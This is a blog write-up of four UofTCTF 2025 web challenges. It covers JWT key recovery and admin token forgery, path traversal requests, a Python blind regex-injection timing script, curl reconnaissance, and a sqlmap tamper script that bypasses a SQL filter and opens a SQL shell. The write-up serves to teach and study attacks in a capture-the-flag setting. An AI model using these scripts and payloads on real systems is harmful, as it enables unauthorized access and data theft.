---
title: UofTCTF 2025
tags:
  - "#web"
  - "#cybersecurity"
  - "#ctf"
description: |-
  My Writeup for UofTCTF 2025. 

  Edited by LLM for sake of grammar, clarity, and speed.
categories: [CTFs, Web Exploitation]
date: 2025-01-23 21:00:00 -0400
---
All challenges can be found here https://github.com/UofTCTF/uoftctf-2025-chals-public?tab=readme-ov-file

### Table Of Content
- Prepared: Flag 1
- 1337 v4ul7 (495)
- CodeDB (388)
- Scavenger Hunt (100)

> Not it any order

### 1337 v4ul7 (495)

> 13 Solves

This was the challenge description.
```
I've started learning the fascinating language of LeetSpeak, and recording some of my notes in my diary. Good thing I built this vault to keep it away from prying eyes!

Visit the website here

Author: SteakEnthusiast
```

Surprisingly this challenge only had 13 solves and I was the second person to solve this challenge. Crazy.


#### Introduction


In this challenge we are given this login form (with only username) and the goal is to login as the admin user. 

![UI of the challenge page](https://i.imgur.com/zIGeWeI.png)


If you login as any username other than `4dm1n` this is what you saw:

![](https://i.imgur.com/5itetfM.png)
> You see a message that says "W3lc0m3 `<username>`! Y0u 4r3 n0t 4n 4dm1n."


When you try to login as `4dm1n` it will tell you "Acc355 D3n13d".

#### Semi-unsuccessful steps

At first I thoung that maybee this is an injection challenge. I tried various types of injection like SQL injection, NoSQL injection, SSTI injection, etc. However, non of them worked. 

Next thing that I tried was instead of sending string, I though about what would happen if I sent an array. 

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=4dm1n
```

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[]=4dm1n
```

This was the result:
![](https://i.imgur.com/FK5XNVb.png)

Looking at the error message saying `TypeError: username.toLowerCase is not a function` and seeing the new JavaScript file `/usr/src/app/5up3r_53cur3_50urc3_c0d3.js` I though about what would happen if I used mixed cases, so `4dm1n` would become `4dM1N`. Sadly, that also gave an "Acc355 D3n13d" error. 

I also tied to see may be various encoding might help bypass the filter, but all attempt failed.

> I also tried some path traversal stuff, because `/usr/src/app/5up3r_53cur3_50urc3_c0d3.js` path in the error message made it pretty clear that the attacker wanted us to leak the content of this file.


I also went to robots.txt file, and I found this
```
User-agent: *
Disallow: /1337_v4u17
```
> I needed to be admin to access the `/1337_v4u17` page

#### Solution

My attention slowly started focusing on the JWT token that was being used to "prove" authentication. 
```
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3MzcxNTE3NTR9.mpJBb0Hp7ubkueyEeH7ZAXFuxztSHCC1eMmHxy8PbwNVdvawaGoUOyWYicPYSSBJsBCAVtcb56f6G-0FOvXstmTidTWmvHiU0RXe5z9SZp42c_FIwEvASP0asPPInIASJpmGG1Xav-lvsZaolzzMhCX5Avp8xiT8OjJkmEFMuOW-8GQj37rgKQGS8QbjjgZrdOXuNz6ZPzjZMYcbHaQ6S8qHIYSWkge3F6PLf56vK4sjSNCX4tkqxdQF-a9bkznoP6zW8JJRVHoSwc0s_nOkS8L4ABXjP9-x5dVUQELFvBft9uzrAmcC7_8EoJe0e4TXBb3wSyEBArJtSoxpyVksPA; Path=/; 
```

When I decoded it using https://jwt.io/, this is what I saw:
![](https://i.imgur.com/FKUokft.png)

> I noticed that they were using RS256 algorithm for the JWT. This stood out to me, because by default JWT algorithm is not set to `RS256`, you would have to deliberately attempt to set that action.

I went on to the PayloadAllThings GitHub repo https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token which I know listed some of the attack method against JWT token.

So, I methodically read all of the attacks against JWT and tried each one of them (if it made sense to use that method ofc). 

I noticed that before, implementing one of the attack (Key Confusion Attack RS256 to HS256), I needed to recover JWT public key from Signed JWT. So that's what I did. 

However, it did not work for some reason, at this time. I was bit tired, so I did not bother looking too much into it, instead focused on other challenges (the CTF had just started). But later on I read this https://pentestkit.co.uk/jwt/recover_key.html and was able to use this tool https://github.com/FlorianPicca/JWT-Key-Recovery.git with `e = 1337` to recover the public key.

```bash
git clone https://github.com/FlorianPicca/JWT-Key-Recovery.git
cd JWT-Key-Recovery
python3 ./recover.py JWT_1 JWT_2 -e 1337
```
> Modified code snippet from https://pentestkit.co.uk/jwt/recover_key.html

In this case, JWT_1 and JWT_2 were the JWT token for two different username. And `-e 1337` was the RSA public exponent used (default is 65537). I think most people were stuck with changing the RSA public exponent to `1337`. I kind of guesses it was that because of the challenge description and title mentioned `1337`.

I was able to recover the public key:
```
-----BEGIN PUBLIC KEY-----
MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQEAsPUnTadAY3deAC+OX+QD
20rWNwcpREevkwBWvKzEhgPvyGeY1A00iyF1GgwQ/0vXBVLIMnyQseVOkIY5iNGg
wdatWCETvMflXCqdXox5G8TCdn7Zh+h1fqipNo8rO5qP+SJAO3ON82Bq/8lNe1yP
e2SAEkK6f9i66Q46FtDbVotkDgEy25TJdnypv6HyB0zqEhbCiChWQu8bsd7bx6cd
sM5wiO0BnfwKRvlF/PtxRZr3pJqqeYLzy76XKkPcB4bRcMqf0L0k8V1ZkziHMzv/
ML4kA9JaDlLhDow2sKijszccruep+KsS8jBwQhjrXlYG0liZ36+x/ydkgxWIvTKW
rwICBTk=
-----END PUBLIC KEY-----
```

I was not able to the RSA key confusion attack, so after searching around for few hours, I attempted to see if I could retrieve private key.


I was able to generate the private key via this tool:
https://github.com/RsaCtfTool/RsaCtfTool/tree/master

```
python3 RsaCtfTool.py --publickey public.pem --attack all --private
```

I signed the JWT token with the private key using CyberChef (to become admin):
```json
{
    "username": "4dm1n",
    "iat": 1736603649
}
```

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRkbTFuIiwiaWF0IjoxNzM2NjAzNjQ5fQ.V7LUY3hRFZiGr2tAuug4zBPx6YPD2MrmvClj6AkEZJSL72W4u5BezvysmUWSmpdqz5aD-dfWaa4lYe6MAcMG7hhWyho-lP6ql-2SPLQhTg-CKgDM2MmbiBHpkZGFp1wdWA6enfaD7ccqdLeN-IwKX2chdsN9oxMhVqJNsqIN04H-nNQdKlaRuD75dDH4UFAYnLWHjP1QynDCd7ss7MJZzULXG9cGK-7JeDuAGdHJKypUts0a2mg463FAGMgL6JvoYEn65Tm8NhbeNgIY9d4ETEmjUMu_6LhMbd4EjoI-GsV45N054qW2Y2yFMxZzznMgjzhu-QXwdFJcEQLOK4qyDg
```
> You can also use https://jwt.io/

I though I would be done with the challenge after visiting `/1337_v4u17`, but I was wrong, the challenge was not over...


I now was able to access a page where the "admin" kept their jornal.
![](https://i.imgur.com/B7LZYcn.png)


When I clicked on the journal I was sent to this page: `GET /1337_v4u17?file=vault%2Fjournal1.txt HTTP/1.1`.

This felt like a case of path traversal, so that's what I tried.


I was able to retired that path from before via path traversal (`file=vault/../../../../../../usr/src/app/5up3r_53cur3_50urc3_c0d3.js`)
```
GET /1337_v4u17?file=%76%61%75%6c%74%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%75%73%72%2f%73%72%63%2f%61%70%70%2f%35%75%70%33%72%5f%35%33%63%75%72%33%5f%35%30%75%72%63%33%5f%63%30%64%33%2e%6a%73 HTTP/1.1
```
> It looks like a mess because I used Burp's Decoder tool to encode path traversal input into URL encoded.

This is what I found (redacted for convenience):
```js
...
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const SECRET_FLAG = require('secret-flag')
const app = express();
const PORT = process.env.PORT || 1337;
...
```

I know that I wanted to know what was in `require('secret-flag')` to I started by searching for `secret-flag.js`, but nothing could be found.

Then, I tied `/node_modules/secret-flag/index.js` which I thought would be the next step on where I could find the flag, and I was correct. 

`file=vault/../../../../../../usr/src/app/node_modules/secret-flag/index.js`
```
GET /1337_v4u17?file=%76%61%75%6c%74%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%75%73%72%2f%73%72%63%2f%61%70%70%2f%6e%6f%64%65%5f%6d%6f%64%75%6c%65%73%2f%73%65%63%72%65%74%2d%66%6c%61%67%2f%69%6e%64%65%78%2e%6a%73 HTTP/1.1
```

I found the flag
```js
const SECRET_FLAG = "uoftctf{l337_15_p3rf3c7_f0r_fl465_4nd_3xp0n3n75}";
module.exports = SECRET_FLAG;
```

```
uoftctf{l337_15_p3rf3c7_f0r_fl465_4nd_3xp0n3n75}
```

----
### CodeDB (388)

> 54 Solves

This one was an challenge was really fun to solve. Here is the challenge description:

![Welcome to CTRL+F the website! It's pretty much just GitHub code search.|400](https://i.imgur.com/WIv5aFr.png)


#### Introduction

In this challenge we basically an code search engine tool, where you are search for code using normal text or regex if you use this format `/regex/`.

![Code Search Tool where you can use regex](https://i.imgur.com/wSW65nZ.png)

---

This was the file layout of the attachment we were given:

```
├── Dockerfile
└── src
    ├── app.js
    ├── code_samples
    │   ├── DataProcessor.scala
    │   ├── MainActivity.kt
    │   ├── SimpleApp.swift
    │   ├── flag.txt
    │   (and more files....)
    │   
    ├── package-lock.json
    ├── package.json
    ├── public
    │   ├── css
    │   │   └── styles.css
    │   └── js
    │       └── scripts.js
    ├── searchWorker.js
    └── views
        ├── index.ejs
        └── view_code.ejs
```

Here is the little introduction of important file (for this challenge):
* `app.js`
	* Main express app. Has two end points:
		* GET `/view/:fileName`
			* Only get's files that are listed in `code_samples` (cannot retrieve flag.txt due to `visible: file !== 'flag.txt'`). 
		* POST `/search`
			* Searches for content of files inside of `code_samples`, based on the query (which could be text or regex).
* `code_samples`
	* List of files beings searched, including flag.txt
* `searchWorker.js`
	* The file that is actually doing the searching. It also generates a preview.

#### Semi-unsuccessful steps

Initially I started by downloading the given attachment (code for the application). Then first inspected the packages and checked if there were any known vulnerabilities with it. There were no vulnerabilities.

Then I started to slowly read the code. 

It was not too difficult to read the application code, but it was very divided so had to take notes as I went down looking at the code.

Two main vulnerabilities that I suspected were:
- Path Traversal
- SSTI
- Prototype pollution


I thought it might be an prototype pollution because of this. When I was briefly scanning though the code this stuck out since infiltered used input was being used as a key. On the hindsight, it was a mistake because there was not prototype pollution here.

`src\app.js`
```js
app.get('/view/:fileName', (req, res) => {
  const fileName = req.params.fileName;
  const fileData = filesIndex[fileName];
  ....
});
```


Next, I though there was an issue with the `language` input, since it was an unfiltered user input. However, that was not the case. The language user input was not doing anything interesting. 

`src\app.js`
```js
app.post('/search', async (req, res) => {
  const query = req.body.query.trim();
  const language = req.body.language;
  ...
});
```


When that looking at those did not work, I started suspecting SSTI in code preview feature mainly because search text was not being filtered properly. But I quickly dispelled that thought because frontend JavaScript was being used to render the SSTI. And I have not see a case where there was SSTI when the code sends a request to an API and gets a json response back, which then is processed by JavaScript to show the result (take this with grain of salt, just because I have not seen it does not mean it does not exist). 

```js
function generatePreview(content, matchIndices, previewLength) {
  adjustedIndices.forEach(match => {
    preview =
      preview.slice(0, match.start) +
      `<mark>${preview.slice(match.start, match.end)}</mark>` +
      preview.slice(match.end);
  });
  return (preview.includes("<mark></mark>")) ? null : preview;
```


> There were couple of other things that I considered and checked, but I won't bother mentioning them.

#### Solution

While I was stuck in infinite loop of self doubt and searching for vulnerabilities. One of my team mates, gave this article: https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets (It is an interesting article, so pls do give it a read).

The article also referred to "founder" of the attack: https://diary.shift-js.info/blind-regular-expression-injection/ (more technical read).

It basically states that regex can be injected cleverer, like a blind SQL injection to retrieve information. You create a regex, if your regex matches then you cause ReDoS (Regular Expression Denial of Service). If there is a timeout in server response (e.g. server is slow to respond), you can assume that attack was successful. 

In our case, since the server implement timeout where your search "timeout" if it does not finish withing 1 second, we don't have to worry about causing DoS. 

TLDR; You use ReDoS to determine secrets based on a time delay when executing regex.


So i wrote a python script, that checks for time delay to determine if the flag is correct or not.


> Reason why this exploit works is because there is a timeout preventing ReDoS attack and application is searching for all the files content, regardless of it's "visibility",

```python
import requests
import re
import string

base_url = "http://34.162.172.123:3000"
search_api = f"{base_url}/search"
timeout = 1.0

symbols = "}{_|!#$%&()*+,-./:;<=>?@[\\]^~"
characters = f"{symbols}{string.ascii_lowercase}{string.digits}{string.ascii_uppercase}"

# "known" part of the secret
possible_flag = "uoftctf{"
while True:
    for char in characters:
	    # Reference: https://diary.shift-js.info/blind-regular-expression-injection/
        query = "/^(?=^" + re.escape(f"{possible_flag}{char}") + ")((((.*)*)*)*)*salt/"
        payload = {
            "query": query,
            "language": "All"
        }
        res = requests.post(search_api, data=payload)
        if res.status_code != 200:
            continue
        seconds = res.elapsed.total_seconds()
        if seconds > timeout:
            possible_flag += char
            print("Building Flag:", possible_flag)
            if (char == "}"):
                print("flag?")
                break
    if bool(re.match(r"^uoftctf\{.*\}$", possible_flag)):
        break
print(possible_flag)
```

> For the longest time I forgot to `re.escape(` so the regex started bugging out when it encountered "?". 

Output:
![](https://imgur.com/tmucn4V.png)


-----
### Scavenger Hunt - 100

> 499 Solves

http://34.150.251.3:3000/

The flag is divided into various parts and spread throughout the website:

```bash
curl -s http://34.150.251.3:3000/ | grep uof
```
> `-s` means silent (in our case it prevents output progress bar)


Response:
```html
<!-- part 1: uoftctf{ju57_k33p_ -->
```

Flag 1/7: `uoftctf{ju57_k33p_`

---

```bash
curl --head -s http://34.150.251.3:3000/
```
> `--head` means only show the response header from the server

Response:
```bash
HTTP/1.1 200 OK
X-Powered-By: Express
X-Flag-Part2: c4lm_4nd_
Set-Cookie: user=guest; Path=/; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 2461
Connection: keep-alive
Keep-Alive: timeout=5
```

Flag 2/7: `c4lm_4nd_` (X-Flag-Part2 header)

----

```bash
curl -s http://34.150.251.3:3000/hidden_admin_panel --head
```

Response:
```
HTTP/1.1 403 Forbidden
X-Powered-By: Express
X-Flag-Part2: c4lm_4nd_
Set-Cookie: user=guest; Path=/; HttpOnly
Set-Cookie: flag_part3=1n5p3c7_; Path=/; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 1682
Connection: keep-alive
Keep-Alive: timeout=5
```

Flag 3/7: `1n5p3c7_` (2nd Set-Cookie header)

----

```bash
curl -s http://34.150.251.3:3000/robots.txt
```
> `robots.txt` is a common text file in website. Read more here: https://developers.google.com/search/docs/crawling-indexing/robots/intro


Response:
```
User-agent: *
Disallow: /hidden_admin_panel
# part4=411_7h3_
```

Flag 4 / 7 = `411_7h3_`


----

```
curl -s http://34.150.251.3:3000/styles.css
```

Response:
```css
/* p_a_r_t_f_i_v_e=4pp5_*/
```

Flag 5 / 7 = `"4pp5_"`

----

```bash
curl -s http://34.150.251.3:3000/hidden_admin_panel -H "Cookie: user=admin" | grep flag
```
> `-H` flag is used to set custom header using curl.

Remember the `Set-Cookie: user=guest; Path=/; HttpOnly` and the hidden path from robots.txt `Disallow: /hidden_admin_panel` ? we combined information from those two to get this part of the flag.

Response:
```html
<strong>Part 6:</strong> <span class="flag">50urc3_</span>
```

Flag 6 / 7 = `50urc3_`

----

```bash
curl -w "\n" -s http://34.150.251.3:3000/app.min.js.map
```
> `-w` just adds a new line (`\n`) after the response, so it is easier to read for me.

I know about this path because of `//# sourceMappingURL=app.min.js.map` in the `app.min.js`. And I know about `app.min.js` because `<script src="/app.min.js"></script>` in the main (`/`) site.

Response:
```
"part7":"c0d3!!}"
```


Flag 7 / 7 = `c0d3!!}`


Flag:
```
uoftctf{ju57_k33p_c4lm_4nd_1n5p3c7_411_7h3_4pp5_50urc3_c0d3!!}
```

----

### Prepared: Flag 1 
> 33 Solves
#### Introduction

This was the challenge description.
```
Who needs prepared statements and parameterized queries when you can use the amazing new QueryBuilder™ and its built-in DirtyString™ sanitizer?

Author: SteakEnthusiast
```

The server implemented a simple login system using MariaDB and Flask. We were given the server code, so it was pretty easy to figure out.

The app implements its own version of SQL filtering, so I figured we might need some kind of SQL injection attack to work (it is almost never a good idea to implement your own version of SQL parser).

#### Background

Usernames and passwords were being filtered by `DirtyString`, which returned an error for any non-ASCII characters and any characters listed in `MALICIOUS_CHARS`.

```python
du = DirtyString(username, 'username')
dp = DirtyString(password, 'password')
```

```python
MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]
```

Then the username `du` and password `dp` were sent to `QueryBuilder`:
```python
qb = QueryBuilder(
    "SELECT * FROM users WHERE username = '{username}' AND password = '{password}'", [du, dp]
)
```

This is how the `QueryBuilder` object was initialized:
```python
def __init__(self, query_template, dirty_strings):
	self.query_template = query_template
	self.dirty_strings = {ds.key: ds for ds in dirty_strings}
	self.placeholders = self.get_all_placeholders(self.query_template)
```

The `query_template` is the SQL query (string), and `dirty_strings` is a dictionary (HashMap), for example: `{"username": du, "password": dp}`.

The `placeholders` is basically an array (list) of strings that match this regex `\{(\w+)\}`, for example, `{username}` and `{password}` both match the regex mentioned here.

In our case, this function will return `['username', 'password']`
```python
def get_all_placeholders(self, query_template=None):
	pattern = re.compile(r'\{(\w+)\}')
	return pattern.findall(query_template)
```

----

Then we have the `build_query` function that does most of the work in this class. I have added some comments in the function so it makes more sense.

```python
def build_query(self):
	# This is the SQL string
	# E.g., SELECT * FROM users WHERE username = '{username}'...
	query = self.query_template
	# Array of "{word}". E.g., ['username', 'password']
	self.placeholders = self.get_all_placeholders(query)

	while self.placeholders:
		# key = first item in the placeholder array
		key = self.placeholders[0]
		# `format_map` will create a Python dictionary (hashmap)
		# The dictionary keys would be each item from placeholders
		# The values are a function that takes two arguments
		# (the first argument is not important, the second is the string)
		# The function will return "{second_argument_text}" as the value
		# E.g., format_map['password'](None, "apple") returns "{apple}"
		format_map = dict.fromkeys(self.placeholders, lambda _, k: f"{{{k}}}")

		for k in self.placeholders:
			# Basically if `k` in ["username", "password"] (initially)
			if k in self.dirty_strings:
				# If the first item in placeholders == `k`
				if key == k:
					# Get the value
					# `dirty_strings` is a dict that stores `DirtyString`
					format_map[k] = self.dirty_strings[k].get_value()
			else:
				format_map[k] = DirtyString
		# Reminder, `query` is a string
		# `format_map` works similarly to .format string but takes a dict as a mapping
		query = query.format_map(type('FormatDict', (), {
			'__getitem__': lambda _, k: format_map[k] if isinstance(format_map[k], str) else format_map[k]("", k)
		})())
		# See if there are more strings in this format "\{(\w+)\}"
		self.placeholders = self.get_all_placeholders(query)
		
	return query
```

----

Let's break down this part even more:
```python
query = query.format_map(type('FormatDict', (), {
			'__getitem__': lambda _, k: format_map[k] if isinstance(format_map[k], str) else format_map[k]("",k)
		})())
```

For example, when I run:
```python
print("Hello my name is {username}".format_map({
    "username": "cool_user", 
    "password": "vry_secure_pass"
}))
```

The output would be:
```
Hello my name is cool_user
```

I can also do something like this:
```python
print("Hello my name is {username[prefix]}{username[suffix]}".format_map({
    "username": {
        "prefix": "cool",
        "suffix": "user"
    }, 
    "password": "vry_secure_pass"
}))
```

The output would be:
```
Hello my name is cooluser
```

A cool thing about this is that we can also call things inside a class:
```python
class Car:
    model = "Toyota"

my_car = Car()
print("Hello my name is {car.model}".format_map({
    "car": my_car
}))
```

The output would be:
```
Hello my name is Toyota
```

-----

Now, remember that when `placeholders` is anything other than `dirty_strings`, `format_map[k] = DirtyString`. This means there is a possibility we might be able to access `DirtyString.MALICIOUS_CHARS` and the inner workings of the `DirtyString` class.

When I send:
```
username:user
password:value
```

This is what happened (all the variables and their values):
```
dirty_strings: {'username': user, 'password': value}

self.placeholders: ['username', 'password']

format_map (before for loop): {'username': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>}

format_map (after for loop): {'username': 'user', 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>}

self.placeholders: ['password']

format_map (before for loop): {'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943940>}

format_map (after for loop): {'password': 'value'}
```
> This output is behind the scenes of what happened. I used print statements to get these.

----

This is what happens when we send in the POST request:
```
username:user{x}
password:value
```

```
dirty_strings: {'username': user{x}, 'password': value}

self.placeholders: ['username', 'password']

format_map (before for loop): {'username': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>}

format_map (after for loop): {'username': 'user{x}', 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>}

self.placeholders: ['x', 'password']

format_map (before for loop): {'x': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>}

format_map (after for loop): {'x': <class '__main__.DirtyString'>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>}
self.placeholders: ['password']

format_map (before for loop): {'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd49438b0>}

format_map (after for loop): {'password': 'value'}
```
> This output is behind the scenes of what happened. I used print statements to get these.

You can see that `{x}` becomes an instance of the `DirtyString` object at some point, meaning we can access previously inaccessible characters via `{x}{x.MALICIOUS_CHARS}`.

----


For example, when I send in this POST request:
```
username:user{x}{x.MALICIOUS_CHARS}
password:value
```

I get this in the HTTP response:
```
Database query failed: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\\', '/', '*', '+%', '-', ';', '#', '(', ')', ' ', ',']' AND password = 'value'' at line 1
```
> This is the user-visible output that the server returns due to SQL errors.

----

#### Solution

Now that we can use restricted values, I created a custom tamper script in `sqlmap` that will basically bypass the filters via the `MALICIOUS_CHARS` array index.

`custom_tamper.py` file
```python
#!/usr/bin/env python
def tamper(payload, **kwargs):
    """
    Replaces each character defined in `mapping` with the corresponding 
    "{apple.MALICIOUS_CHARS[index]}" placeholder in the given payload.
    """

    mapping = {
        '"': '{a.MALICIOUS_CHARS[0]}',
        "'": '{a.MALICIOUS_CHARS[1]}',
        '\\': '{a.MALICIOUS_CHARS[2]}',
        '/': '{a.MALICIOUS_CHARS[3]}',
        '*': '{a.MALICIOUS_CHARS[4]}',
        '+%': '{a.MALICIOUS_CHARS[5]}',  # '+%'
        '-': '{a.MALICIOUS_CHARS[6]}',
        ';': '{a.MALICIOUS_CHARS[7]}',
        '#': '{a.MALICIOUS_CHARS[8]}',
        '(': '{a.MALICIOUS_CHARS[9]}',
        ')': '{a.MALICIOUS_CHARS[10]}',
        ' ': '{a.MALICIOUS_CHARS[11]}',
        ',': '{a.MALICIOUS_CHARS[12]}'
    }

    # Perform replacements in the payload
    if payload:
        for original_char, placeholder in mapping.items():
            payload = payload.replace(original_char, placeholder)
        payload += "{a}"

    return payload
```
> I know there is a better way to write this script, but when I was solving this challenge, this was the first thing that came to mind.


Now, we will use `sqlmap` on the target:
```bash
sqlmap -u "<URL>" --data="username=admin&password=1234" --method=POST --dbms="mariadb" --tamper=custom_tamper.py -p username --sql-shell
```

Once you have the SQL shell, you can run these commands to get the flag:
```bash
sql-shell> use prepared_db;
sql-shell> select * from flags;
```

Then you will get the flag:
```
uoftctf{r3m3mb3r_70_c173_y0ur_50urc35_1n_5ql_f0rm47}
```